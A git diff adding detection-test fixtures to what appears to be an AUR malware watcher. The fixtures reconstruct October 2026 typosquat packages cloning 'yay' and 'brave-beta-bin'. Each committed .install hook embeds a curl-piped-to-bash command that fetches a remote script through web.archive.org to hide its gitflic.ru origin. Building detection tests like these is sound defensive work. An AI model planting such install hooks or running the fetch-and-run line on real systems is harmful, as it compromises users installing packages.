@@ -252,6 +252,165 @@ add("aug-fsearch-bin-source-without-checksum",
     campaign="aug-adoption-lock", fidelity="representative",
     must_fire=["H091", "H004"], min_score=65)
 
+# ── October 2026: two in-the-wild typosquat waves ──────────────────────────
+#
+# Two clusters the watcher flagged live (H045 mass adoption, H052 shared
+# source-repo, G003 campaign): fifteen created names around `yay` and fourteen
+# around `brave-beta-bin`.  (A fifteenth brave-cluster member, `firefox-git-bin`,
+# was a hijacked legitimate package, not a clone; see README in data/iocs.)  Both
+# waves shipped the *upstream* recipe intact and appended the same payload to a
+# committed `<pkg>.install`, fetched through web.archive.org so the gitflic.ru
+# origin rode in behind a trusted archive host:
+#
+#     bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/...')
+#
+# Unlike the June/July corpora these bytes are still served by AUR cgit, so the
+# two fixtures below embed the *real* `ay` and `bravve-beta-bin` `PKGBUILD` and
+# `.install` verbatim (`fidelity="verified"`): same version, contributors, and
+# checksums as the takedown.  Only the two payload-bearing files appear, matching
+# what the corpus analyzer reconstructs (PKGBUILD plus an added-file `.install`);
+# the companion non-payload files a real repo also carried (`.desktop`, `.sh`,
+# `logo.png`) are omitted.
+
+_CAMPAIGN_PAYLOAD = (
+    "bash <(curl -L 'https://web.archive.org/web/"
+    "https://gitflic.ru/project/hellscripter/install-scripts/"
+    "blob/raw?file=linux.sh' 2>/dev/null)"
+)
+
+_AY_PKGBUILD = """\
+# Maintainer: Jguer <pkgbuilds at jguer.space>
+pkgname=ay
+pkgver=13.0.1
+pkgrel=1
+pkgdesc="Yet another yogurt. Pacman wrapper and AUR helper written in go."
+arch=('i686' 'pentium4' 'x86_64' 'arm' 'armv7h' 'armv6h' 'aarch64' 'riscv64')
+url="https://github.com/Jguer/yay"
+install="$pkgname.install"
+options=(!lto)
+license=('GPL-3.0-or-later')
+depends=(
+  'pacman>6.1'
+  'git'
+)
+optdepends=(
+  'sudo: privilege elevation'
+  'doas: privilege elevation'
+)
+makedepends=('go>=1.24')
+source=("${pkgname}-${pkgver}.tar.gz::https://github.com/Jguer/yay/archive/v${pkgver}.tar.gz")
+sha256sums=('b77454bce87110180a1b6664c2d260de78124c9894b71101610ba84f551eb0d0')
+
+build() {
+  export GOPATH="$srcdir"/gopath
+  export CGO_CPPFLAGS="${CPPFLAGS}"
+  export CGO_CFLAGS="${CFLAGS}"
+  export CGO_CXXFLAGS="${CXXFLAGS}"
+  export CGO_LDFLAGS="${LDFLAGS}"
+  export CGO_ENABLED=1
+
+  cd "$srcdir/$pkgname-$pkgver"
+  make VERSION=$pkgver DESTDIR="$pkgdir" PREFIX="/usr" build
+}
+
+package() {
+  cd "$srcdir/$pkgname-$pkgver"
+  make VERSION=$pkgver DESTDIR="$pkgdir" PREFIX="/usr" install
+}
+"""
+
+_BRAVE_PKGBUILD = """\
+# Maintainer: brave-prerelease <aur-prerelease@brave.com>
+# Contributor: Greg White <gwhite@kupulau.com>
+# Contributor: whezzel <whezzel at gmail dot com>
+# Contributor: Caleb Maclennan <caleb@alerque.com>
+# Contributor: Jacob Mischka <jacob@mischka.me>
+# Contributor: Manuel Mazzuola <origin.of@gmail.com>
+
+pkgname=bravve-beta-bin
+pkgver=1.98.47
+pkgrel=1
+pkgdesc='Web browser that blocks ads and trackers by default (beta binary release).'
+arch=(x86_64 aarch64)
+install="$pkgname.install"
+url='https://brave.com/download-beta'
+license=('MPL2')
+depends=('gtk3' 'nss' 'alsa-lib' 'libxss' 'ttf-font')
+optdepends=('cups: Printer support'
+            'mesa: Hardware accelerated rendering'
+            'libglvnd: Support multiple different OpenGL drivers at any given time'
+	    'libgnome-keyring: gnome keyriung support')
+provides=("${pkgname}" 'brave-beta-browser')
+conflicts=()
+source=("brave-beta-bin.sh")
+source_x86_64=("https://github.com/brave/brave-browser/releases/download/v${pkgver}/brave-browser-beta_${pkgver}_amd64.deb")
+source_aarch64=("https://github.com/brave/brave-browser/releases/download/v${pkgver}/brave-browser-beta_${pkgver}_arm64.deb")
+sha512sums=('56be4daa8294c7c3d4b3f1ce7169ac575be0faa623d7cd977eb135e971914b90e3f596ecad72d89178de04e65cd3d49c138e8518d1dccf9fc814d0858b38767e')
+sha512sums_x86_64=('572ee5ca41bd141be14c8d4fd4c11edf911d671b30bc3122a83f9de8e12257f902a2ae174ba61536ec7802455483fbe450f9a81495920f404312b051681ec8f6')
+sha512sums_aarch64=('a5f6b3b0513961563f7d22f454c269dd53db73861f0b6a9b1c7a1a412f997018402fc7a696ea78fb1546c8d24b96a80a22b72752a2eb057c9664e29432c134e2')
+
+options=(!strip)
+
+prepare() {
+  mkdir -p brave
+  tar xf data.tar.xz -C brave
+  # Delete unneeded cron job
+  rm -rf brave/opt/brave.com/brave-beta/cron
+  # Use our script to launch (allows overriding flags, sets up data dir)
+  sed -i "s/\\/usr\\/bin\\/brave-browser-beta/\\/usr\\/bin\\/brave-beta/g" brave/usr/share/applications/brave-browser-beta.desktop    
+}
+
+package() {
+    cp -a --reflink=auto brave/opt "$pkgdir/opt"
+    cp -a --reflink=auto brave/usr "$pkgdir/usr"
+    
+    install -Dm0755 "$pkgname.sh" "$pkgdir/usr/bin/brave-beta"
+    install -Dm0644 "brave/opt/brave.com/brave-beta/product_logo_128_beta.png" "$pkgdir/usr/share/pixmaps/brave-browser-beta.png"
+
+    install -Dm0664 -t "$pkgdir/usr/share/licenses/$pkgname" "brave/opt/brave.com/brave-beta/LICENSE"
+    chmod 4755 "$pkgdir/opt/brave.com/brave-beta/chrome-sandbox"
+}
+"""
+
+
+def _new_file(path: str, content: str) -> str:
+    """A git diff that adds *path* as a new file (the watcher's first sight)."""
+    lines = content.splitlines()
+    return (
+        f"diff --git a/{path} b/{path}\nnew file mode 100644\n"
+        f"--- /dev/null\n+++ b/{path}\n"
+        f"@@ -0,0 +1,{len(lines)} @@\n"
+        + "".join(f"+{line}\n" for line in lines)
+    )
+
+
+def _install_with_payload(pkg: str) -> str:
+    return (
+        "post_install() {\n  true\n}\n\n"
+        "post_upgrade() {\n  post_install\n}\n\n"
+        f"{_CAMPAIGN_PAYLOAD}\n"
+    )
+
+
+add("yay-typosquat-install-hook",
+    _new_file("PKGBUILD", _AY_PKGBUILD)
+    + _new_file("ay.install", _install_with_payload("ay")),
+    description="October 2026: one of fifteen `yay` name-clones (maintainer "
+                "impersonating Jguer). The upstream recipe is byte-intact and "
+                "the payload rides in a committed `ay.install`, fetched "
+                "through web.archive.org to launder the gitflic.ru origin.",
+    campaign="yay-typosquat-2026-10", fidelity="verified",
+    must_fire=["H075"], min_score=60)
+
+add("brave-typosquat-install-hook",
+    _new_file("PKGBUILD", _BRAVE_PKGBUILD)
+    + _new_file("bravve-beta-bin.install", _install_with_payload("bravve-beta-bin")),
+    description="October 2026: one of fifteen `brave-beta-bin` name-clones. "
+                "Same delivery as the yay wave - intact upstream recipe plus "
+                "an appended archive-laundered fetch in a committed .install.",
+    campaign="brave-typosquat-2026-10", fidelity="verified",
+    must_fire=["H075"], min_score=60)
+
 # ── Controls: the must-not-fire surface names ──────────────────────────
 
 add("control-arch-check-and-generated-desktop",
